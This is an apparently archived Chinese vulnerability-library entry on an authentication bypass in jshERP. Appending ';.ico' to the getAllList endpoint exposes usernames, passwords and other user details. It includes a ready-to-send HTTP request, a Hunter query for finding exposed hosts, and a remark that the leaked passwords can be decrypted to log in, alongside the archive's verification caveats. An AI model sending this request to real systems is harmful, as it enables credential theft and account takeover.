---
source: "wy876 漏洞文库"
title: "华夏/jshERP getAllList;.ico用户信息暴露"
product: "华夏/jshERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未列版本"
prerequisites: "仅分析Cookie无业务会话，仍需鉴权对照"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/grwzu7s9grkulo1a"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%8D%8E%E5%A4%8FERP/%E5%8D%8E%E5%A4%8FERPgetAllList%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
hunter: "web.body=\"jshERP\""
id: "vw-e825a89f5cac87d6fa3f3cfd"
entity_id: "ve-e825a89f5cac87d6fa3f3cfd"
schema_version: "1"
---

# 华夏/jshERP getAllList;.ico用户信息暴露

## 条目说明

- 对象与具体问题：华夏/jshERP；getAllList;.ico用户信息暴露
- 版本、配置及部署条件：未列版本
- 认证与权限前提：仅分析Cookie无业务会话，仍需鉴权对照
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 解密即可登录过宽：密码可能哈希，缺算法/响应证据
- 静态后缀绕过与24相关但不同路径/版本需区分

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
jshERP立志为中小企业提供开源好用的ERP软件，降低企业的信息化成本，目前专注进销存+财务功能。主要模块有零售管理、入库管理、出库管理、组装拆卸、财务管理、报表查询、基础数据、系统管理等。支持预付款、收入支出、仓库调拨、采购销售、礼品卡等特色功能。拥有库存状况、出入库统计等报表。同时对角色和权限进行了细致全面，精确到每个按钮和菜单。该系统存在敏感信息泄露漏洞，通过此漏洞攻击者可以获取系统用户，登录用户名，密码，职位等个人敏感信息。

## 二、影响版本
+ jshERP

## 三、资产测绘
+ Hunter`web.body="jshERP"`
+ 特征


## 四、漏洞复现
```http
GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1704276087; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1704276315
Upgrade-Insecure-Requests: 1
```


解密即可登录


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/grwzu7s9grkulo1a>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
